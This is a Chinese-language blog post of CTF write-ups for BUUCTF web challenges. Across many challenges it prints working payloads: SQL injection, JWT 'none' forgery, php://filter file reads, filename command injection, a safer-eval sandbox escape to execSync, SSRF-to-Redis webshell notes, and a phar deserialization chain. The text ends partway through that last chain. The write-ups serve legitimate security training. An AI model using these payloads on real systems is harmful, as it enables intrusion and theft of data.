
 <!DOCTYPE HTML>
<html lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  
    <title>BUUCTF1 | buxqm</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
    
    <meta name="author" content="Ycj">
    
    <meta name="description" content="[CISCN2019 华北赛区 Day1 Web5]CyberPunk打开题目，查看界面源码发现提示?file，于是将源码读取，发现address处没有过滤，在change.php中发现二次注入点
随便注入以下，发现报错，果然就是报错注入了，数据库逛了一圈，啥也没有，发现题目把load_fileBA">
    
    
    
    
    <link rel="alternate" href="/atom.xml" title="buxqm" type="application/atom+xml">
    
    
    <link rel="icon" href="/img/favicon.ico">
    
    
    <link rel="apple-touch-icon" href="/img/author.jpg">
    <link rel="apple-touch-icon-precomposed" href="/img/author.jpg">
    
    <link rel="stylesheet" href="/css/style.css">
</head>
</html>
  <body>
    <header>
      <div>
		
			<div id="imglogo">
				<a href="/"><img src="/img/logo.svg" alt="buxqm" title="buxqm"/></a>
			</div>
			
			<div id="textlogo">
				<h1 class="site-name"><a href="/" title="buxqm">buxqm</a></h1>
				<h2 class="blog-motto"></h2>
			</div>
			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
			</a></div>
			<nav class="animated">
				<ul>
					
						<li><a href="/">Home</a></li>
					
						<li><a href="/archives">Archives</a></li>
					
					<li>
					
					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
						<label>Search</label>
						<input type="text" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
						<input type="hidden" name="q" value="site:yoursite.com">
					</form>
					
					</li>
				</ul>
			</nav>			
</div>

    </header>
    <div id="container">
      <div id="main" class="post" itemscope itemprop="blogPost">
	<article itemprop="articleBody"> 
		<header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2019/10/02/BUUCTF2/" title="BUUCTF1" itemprop="url">BUUCTF1</a>
  </h1>
  <p class="article-author">By
    
      <a href="http://yoursite.com" title="Ycj">Ycj</a>
    </p>
  <p class="article-time">
    <time datetime="2019-10-01T16:00:00.000Z" itemprop="datePublished">2019-10-02</time>
    Updated:<time datetime="2020-10-13T12:14:14.708Z" itemprop="dateModified">2020-10-13</time>
    
  </p>
</header>
	<div class="article-content">
		
		
		<div id="toc" class="toc-article">
			<strong class="toc-title">Contents</strong>
		<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk"><span class="toc-number">1.</span> <span class="toc-text">[CISCN2019 华北赛区 Day1 Web5]CyberPunk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Zer0pts2020-Can-you-guess-it"><span class="toc-number">2.</span> <span class="toc-text">[Zer0pts2020]Can you guess it?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HFCTF2020-EasyLogin"><span class="toc-number">3.</span> <span class="toc-text">[HFCTF2020]EasyLogin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-文件探测"><span class="toc-number">4.</span> <span class="toc-text">[BJDCTF 2nd]文件探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GYCTF2020-Ezsqli"><span class="toc-number">5.</span> <span class="toc-text">[GYCTF2020]Ezsqli</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#N1CTF-2018-eating-cms"><span class="toc-number">6.</span> <span class="toc-text">[N1CTF 2018]eating_cms</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RoarCTF-2019-Online-Proxy"><span class="toc-number">7.</span> <span class="toc-text">[RoarCTF 2019]Online Proxy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GKCTF2020-EZ三剑客-EzNode"><span class="toc-number">8.</span> <span class="toc-text">[GKCTF2020]EZ三剑客-EzNode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#网鼎杯-2020-玄武组-SSRFMe"><span class="toc-number">9.</span> <span class="toc-text">[网鼎杯 2020 玄武组]SSRFMe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HarekazeCTF2019-encode-and-encode"><span class="toc-number">10.</span> <span class="toc-text">[HarekazeCTF2019]encode_and_encode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF2020-EzPHP"><span class="toc-number">11.</span> <span class="toc-text">[BJDCTF2020]EzPHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPUCTF-2018-SimplePHP"><span class="toc-number">12.</span> <span class="toc-text">[SWPUCTF 2018]SimplePHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#强网杯-2019-Upload"><span class="toc-number">13.</span> <span class="toc-text">[强网杯 2019]Upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NCTF2019-SQLi"><span class="toc-number">14.</span> <span class="toc-text">[NCTF2019]SQLi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HFCTF2020-JustEscape"><span class="toc-number">15.</span> <span class="toc-text">[HFCTF2020]JustEscape</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#网鼎杯2018-Unfinish"><span class="toc-number">16.</span> <span class="toc-text">[网鼎杯2018]Unfinish</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSCCTF-2019-Qual-FlaskLight"><span class="toc-number">17.</span> <span class="toc-text">[CSCCTF 2019 Qual]FlaskLight</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#网鼎杯-2020-白虎组-PicDown"><span class="toc-number">18.</span> <span class="toc-text">[网鼎杯 2020 白虎组]PicDown</span></a></li></ol>
		</div>
		
		<h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h2><p>打开题目，查看界面源码发现提示?file，于是将源码读取，发现address处没有过滤，在change.php中发现二次注入点<img src="https://i.loli.net/2020/10/02/Nt4MJyQTmqIBuzb.png" alt></p>
<p>随便注入以下，发现报错，果然就是报错注入了，数据库逛了一圈，啥也没有，发现题目把load_fileBAN了，就试试直接读flag，因为是ciscn的题目，所以flag都在/flag.txt，由于报错长度限制，分两次爆。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;,`address`= updatexml(1,concat(0x3a,(select substr(load_file(&apos;/flag.txt&apos;),1,25)),0x3a),1)#</span><br><span class="line">&apos;,`address`= updatexml(1,concat(0x3a,(select substr(load_file(&apos;/flag.txt&apos;),25,50)),0x3a),1)#</span><br></pre></td></tr></table></figure>

<h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><p>题目给出源码，看了一下，guess是不可能猜中，也不可能绕过的，所以点肯定在<code>basename($_SERVER[&#39;PHP_SELF&#39;])</code>这里。</p>
<p>basename函数当路径以/结尾时，会返回/前面的内容，当文件名只含有一个非ascii码字符时，basename会将它忽略，所以可以用<code>/index.php/config.php/%ff?source</code>读取flag。</p>
<h2 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h2><p>打开看发现是koa框架，网上查一查，koa通常会在controllers目录中存放处理逻辑js代码，通常是放在api.js/user.js中，访问controllser/api.js得到逻辑代码，发现是一道JWT伪造。</p>
<p>当username=admin时，可以访问/flag。</p>
<p>JWT自身加密的问题，我们可以用alg=’none’绕过，只需要绕过下面这一段代码就行。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'login error'</span>, <span class="string">'no such secret id'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里时一个JS的弱类型问题，以下代码是成立的。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> a =[]</span><br><span class="line"><span class="keyword">if</span>(a==<span class="number">0</span>)&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(a)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们只需要构造secretid=[]即可绕过判断。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">'type'</span>:<span class="string">'jwt'</span>,</span><br><span class="line"><span class="string">'alg'</span>:<span class="string">"none"</span></span><br><span class="line">&#125;</span><br><span class="line">payload=&#123;</span><br><span class="line"><span class="string">'iat'</span>:<span class="number">1587378820</span>,</span><br><span class="line"><span class="string">'username'</span>:<span class="string">'admin'</span>,</span><br><span class="line"><span class="string">'password'</span>:<span class="string">'123'</span>,</span><br><span class="line"><span class="string">'secretid'</span>:[]</span><br><span class="line">&#125;</span><br><span class="line">he=json.dumps(headers)</span><br><span class="line">pa=json.dumps(payload)</span><br><span class="line">a=base64.b64encode(he.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">b=base64.b64encode(pa.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">print(a+<span class="string">'.'</span>+b)</span><br></pre></td></tr></table></figure>

<h2 id="BJDCTF-2nd-文件探测"><a href="#BJDCTF-2nd-文件探测" class="headerlink" title="[BJDCTF 2nd]文件探测"></a>[BJDCTF 2nd]文件探测</h2><p>答开题目，抓包发现提示home.php，进入发现直接跳到了system.php，F12再network处查看网络请求，发现了home.php?file=system请求，试试伪协议读源码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=home</span><br></pre></td></tr></table></figure>

<p>将home和system的代码都读取出来，再home.php中发现存在admin.php，但是要本地访问，flag也被限制的死死的，于是只能在system.php找找。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'q1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'q2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'q3'</span>]) ) &#123;</span><br><span class="line">    $url = $_POST[<span class="string">'q2'</span>].<span class="string">".y1ng.txt"</span>;</span><br><span class="line">    $method = $_POST[<span class="string">'q3'</span>];</span><br><span class="line"></span><br><span class="line">    $str1 = <span class="string">"~$ python fuck.py -u \""</span>.$url .<span class="string">"\" -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $str1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!preg_match($filter1, $url) )&#123;</span><br><span class="line">        <span class="keyword">die</span>($str2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match($filter2, $url)) &#123;</span><br><span class="line">        <span class="keyword">die</span>($str3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/^GET/i'</span>, $method) &amp;&amp; !preg_match(<span class="string">'/^POST/i'</span>, $method)) &#123;</span><br><span class="line">        <span class="keyword">die</span>($str4);</span><br><span class="line">    &#125;</span><br><span class="line">    $detect = @file_get_contents($url, <span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">print</span>(sprintf(<span class="string">"$url method&amp;content_size:$method%d"</span>, $detect));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要求q2必须要以<code>http://127.0.0.1</code>开头，那估计就是用file_get_contents打开admin.php了，发现$url在q2后拼接了字符串，这个可以在q2后加#锚点符或者参数<code>?a=</code>这种形式绕过，最后发现它使用%d来打印返回内容，这肯定要把它改成%s才行。</p>
<p>在<a href="https://www.php.net/manual/zh/function.sprintf.php" target="_blank" rel="noopener">官网</a>搜到，sprintf能够指定参数位置<code>%[argnum$][flags][width][.precision]</code></p>
<p>所以可以指定使用<code>%1$s</code>能够将$detect转变为字符串输出。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q1=flag&amp;q2=http://127.0.0.1/admin.php?a=%1$s&amp;q3=get</span><br></pre></td></tr></table></figure>

<p>同时在官网可以看到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">notice the double %%, this prints a literal &apos;%&apos; character</span><br></pre></td></tr></table></figure>

<p>两个%%符号会输出真正的%，所以也能利用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q1=flag&amp;q2=http://127.0.0.1/admin.php?a=&amp;q3=get%s%</span><br></pre></td></tr></table></figure>

<p>成功获得admin.php代码</p>
<p>admin.php的逻辑非常的脆弱，AES-128-CBC的加密数据是存放在session中的，如果不带sessionid访问，加密数据就是空，我们可以构造出加密空数据后的$cipher</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function aesEn($data, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $method = &apos;AES-128-CBC&apos;;</span><br><span class="line">    $iv = md5(&quot;174.0.0.15&quot;,true);</span><br><span class="line">    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line">echo aesEn(&apos;&apos;,&apos;y1ng&apos;);</span><br></pre></td></tr></table></figure>

<p>将上面的输出传给decrypt，即可得到flag。</p>
<h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><p>简单判断一下，是一道数字型盲注，过滤了or、union等字符，首先将数据库版本弄到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(ascii(substr((version()),1,1))&gt;52,1,0)</span><br></pre></td></tr></table></figure>

<p>版本是5.7.29，在此版本中，sys增加了可以查看表名的视图</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name) from sys.schema_table_statistics where table_schema=database()</span><br></pre></td></tr></table></figure>

<p>得到表名<code>f1ag_1s_h3r3_hhhhh</code>,由于过滤了union，只能使用<a href="https://dev.mysql.com/doc/refman/8.0/en/row-subqueries.html" target="_blank" rel="noopener">Row Subqueries</a>，在mysql中，字符串的比较是按照字典序来比的即<code>&#39;g&#39;&gt;&#39;fzz&#39;</code>，所以以下表达式成立</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((1,&apos;g&apos;)&gt;(select * from f1ag_1s_h3r3_hhhhh))</span><br></pre></td></tr></table></figure>

<p>可以按照这样的思路去爆破，不过爆破出来的结果需要减去1。</p>
<h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><p>注册一个账号登录进去发现可以用伪协议读源码，发现使用parseurl提取处数据过滤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$keywords = [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;];</span><br><span class="line">$uri = parse_url($_SERVER[&quot;REQUEST_URI&quot;]);</span><br><span class="line">parse_str($uri[&apos;query&apos;], $query);</span><br></pre></td></tr></table></figure>

<p>parse_url在碰到格式错误的url时，会返回False,所以我们构造</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:port//user.php?page=php://filter/convert.base64-encode/resource=m4aaannngggeee</span><br></pre></td></tr></table></figure>

<p>就可以绕过过滤，直接包含文件，发现一个templates/upload.html，访问一下，是一个文件上传的点，发现了一个文件<code>upllloadddd.php</code>，上传文件发现这个文件好像并不在当前目录下，使用伪协议读取源码，发现upload在templates的前一级目录。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=upllloadddd</span><br></pre></td></tr></table></figure>

<p>所以我们只能使用文件包含m4aaannngggeee来上传文件，通过读取源码发现，filename并不存在过滤，所以直接使用filename进行命令执行（PS:文件路径会在/处截断），所以我们不能使用/。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;glag;cd ..;ls;cat flag_233333 ;#&quot;</span><br></pre></td></tr></table></figure>

<h2 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2><p>抓包看见了IP地址，XFF可以伪造，会输出当前IP地址与上次的IP地址，当当前IP地址不变时，上次的IP也不会变，感觉应该是储存型SQL注入，后台逻辑应该是前两次输入时，存入数据库，按照输入顺序输出输入变量，当两次输入后，就从数据库读取IP数据，这就造成了注入。</p>
<p><img src="G:%5CMyBlog%5Csource%5Cimages%5CBUUCTF2%5Cimage-20201006220822431.png" alt="image-20201006220822431"></p>
<p>将Payload存入Current Ip</p>
<p><img src="G:%5CMyBlog%5Csource%5Cimages%5CBUUCTF2%5Cimage-20201006220846345.png" alt="image-20201006220846345"></p>
<p>再次输入变成Last Ip</p>
<p><img src="G:%5CMyBlog%5Csource%5Cimages%5CBUUCTF2%5Cimage-20201006220918336.png" alt="image-20201006220918336"></p>
<p>再次输入同样的值，就触发了储存型sql注入，而且没有WAF。</p>
<p>这题的flag存在别的数据库中，所以我们先要爆破一下数据库，然后再一套流程下来，拿到flag。</p>
<p>在最后查flag时，由于是跨库操作，需要指定数据库名，不然会找不到表<code>数据库名.表名</code>。</p>
<h2 id="GKCTF2020-EZ三剑客-EzNode"><a href="#GKCTF2020-EZ三剑客-EzNode" class="headerlink" title="[GKCTF2020]EZ三剑客-EzNode"></a>[GKCTF2020]EZ三剑客-EzNode</h2><p>查看源码，发现使用了safer-eval库，版本是1.3.6，safer-eval通过vm模块做沙箱环境执行代码，隔离代码的上下文环境，也就是说沙箱内部无法访问外部非global变量，但是外部可以访问到沙箱内部变量。</p>
<p>刚说到可以使用全局变量，我们就可以通过process全局对象的mainModule属性来获取当前Module，然后加载child_process子进程模块，该模块中有许多命令执行的方法比如execSync。</p>
<p>safer-eval对会对vm沙箱中的变量值进行过滤，如果碰到global变量就将它赋值为undefined，process显然在其中，那怎么办呢，变量中不能直接有process，我们还可以使用构造函数Function(“return process”);这样也能返回process的值，但是Function也在黑名单中，通过观察safer-eval的源码，我们可以发现safer-eval在沙箱的上下文中添加了6个可使用函数</p>
<p><img src="G:%5CMyBlog%5Csource%5Cimages%5CBUUCTF2%5Cimage-20201007204404024.png" alt="image-20201007204404024"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;clearImmediate&apos;,&apos;clearInterval&apos;,&apos;clearTimeout&apos;,&apos;setImmediate&apos;,&apos;setInterval&apos;,&apos;setTimeout&apos;</span><br></pre></td></tr></table></figure>

<p>所以我们可以使用<code>clearImmediate.constructor</code>来获得Function。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const a=clearImmediate.constructor(&quot;return process;&quot;)();</span><br></pre></td></tr></table></figure>

<p>构造函数并执行返回process。</p>
<p>但是即使一个函数都没有，也可以这样构造(PS:可以自己去试试)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const a=&apos;&apos;.constructor.constructor(&quot;return process;&quot;)();</span><br></pre></td></tr></table></figure>

<p>既然有了process，那一切都好办了</p>
<p>通过process.mainModule获得当前模块<a href="http://nodejs.cn/api/modules.html#modules_module_require_id" target="_blank" rel="noopener">可以用当前模块调用require</a>，引入child_process模块，在child_process模块中有许多命令执行的函数能够使用，最后，由于题目显示的是返回值，所以我们需要以函数返回的形式返回命令执行结果。最终的payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123;const a=clearImmediate.constructor(&quot;return process;&quot;)(); return a.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();&#125;)()</span><br></pre></td></tr></table></figure>

<h2 id="网鼎杯-2020-玄武组-SSRFMe"><a href="#网鼎杯-2020-玄武组-SSRFMe" class="headerlink" title="[网鼎杯 2020 玄武组]SSRFMe"></a>[网鼎杯 2020 玄武组]SSRFMe</h2><p>一道SSRF，将内网地址都过滤了，在此处有三种方式绕过。</p>
<ul>
<li>利用Curl与Parseurl解析的不同绕过，在我的另一篇SSRF学习中有提到。</li>
<li>利用DNS重绑定漏洞，同上。</li>
<li>0.0.0.0未被过滤，0.0.0.0的IP地址表示整个网络</li>
</ul>
<p>但是在BUU上，只能使用第三种方式绕过(无法访问外网)。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:/?url=http://0.0.0.0/hint.php</span><br></pre></td></tr></table></figure>

<p>得到Redis密码。</p>
<p>那就直接用gopher写WebShell咯，具体也在我的SSRF文章中有写到，当然在BUU上可以开一个linux靶机，主从复制也是可以的。</p>
<h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><p>使用json_decode获取数据，查看官方手册。</p>
<p><img src="G:%5CMyBlog%5Csource_posts%5Cimage%5CBUUCTF2%5Cimage-20201010155236979.png" alt="image-20201010155236979"></p>
<p>支持UTF-8编码，那就是支持unicode，直接unicode编码绕过WAF，使用php伪协议读取flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;\u0070\u0061\u0067\u0065&quot;:&quot;\u0070\u0068\u0070\u003a\u002f\u002f\u0066\u0069\u006c\u0074\u0065\u0072\u002f\u0072\u0065\u0061\u0064\u003d\u0063\u006f\u006e\u0076\u0065\u0072\u0074\u002e\u0062\u0061\u0073\u0065\u0036\u0034\u002d\u0065\u006e\u0063\u006f\u0064\u0065\u002f\u0072\u0065\u0073\u006f\u0075\u0072\u0063\u0065\u003d\u002f\u0066\u006c\u0061\u0067&quot;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><p>源码发现一段base32加密的字符，解密进入1nD3x.php。</p>
<p>第一关：绕过$_SERVER[‘QUERY_STRING’]</p>
<p>由于$_SERVER[‘QUERY_STRING’]不会urldecode，所以将上传的参数urlencode一次即可绕过。</p>
<p>第二关：绕过$正则匹配</p>
<p>$在单行查询下不会进行匹配换行符，%0a换号符绕过。</p>
<p>第三关：绕过$_REQUEST</p>
<p>翻阅<a href="https://www.php.net/manual/zh/reserved.variables.request.php" target="_blank" rel="noopener">PHP手册</a>，发现$_REQUEST数组获得值得顺序按照php.ini中的<a href="https://www.php.net/manual/zh/ini.core.php#ini.variables-order" target="_blank" rel="noopener">variables_order</a>配置。</p>
<p>在默认情况下variables_order得值是 EGPCS (<code>Environment</code>, <code>Get</code>, <code>Post</code>, <code>Cookie</code>, and <code>Server</code>)，首先获得GET中的值，然后再获取POST中得值，这里就导致了变量覆盖，所以用POST方法上传参数将GET的参数覆盖即可绕过。 </p>
<p>第四关：绕过file_get_contents($file)</p>
<p>使用data协议</p>
<p>第五关：md5绝对比较</p>
<p>使用数组绕过。</p>
<p>第六关：命令执行<code>$code(&#39;&#39;, $arg);</code>形式</p>
<p>关键点在于：</p>
<ul>
<li><p>使用create_function绕过，由于create_function基于eval实现，可以进行拼接绕过</p>
</li>
<li><p>PHP 自动将裸字符串（没有引号的字符串且不对应于任何已知符号）转换成一个其值为该裸字符串的正常字符串。</p>
</li>
<li><p>fopen,fget未被过滤</p>
</li>
<li><p>define函数可以定义常量，get_defined_vars()</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;define(a,fopen(base64_decode(cmVhMWZsNGcucGhw),r));while(!feof(a))var_dump(fgets(a));fclose(a);//</span><br></pre></td></tr></table></figure>

<p>urlencode即可得到flag。</p>
<h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p>file.php可以读源码，首先将源码读取一遍（file.php,upload_file.php,class.php,function.php）。</p>
<p>图片限制后缀<code>.jpg</code>，非常明显一道phar反序列化，触发点在file.php的is_file()函数，链子也很简单。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str = new Show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str[&apos;str&apos;]=new  Test();</span><br><span class="line"></span><br><span class="line">        echo $this-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $params;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;params[&apos;source&apos;]=&quot;php://filter/read=convert.base64-encode/resource=/var/www/html/f1ag.php&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new C1e4r();</span><br><span class="line">echo serialize($a);</span><br><span class="line">$phar = new Phar(&quot;phar.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头用以欺骗检测</span><br><span class="line">$phar-&gt;setMetadata($a); //将自定义meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span 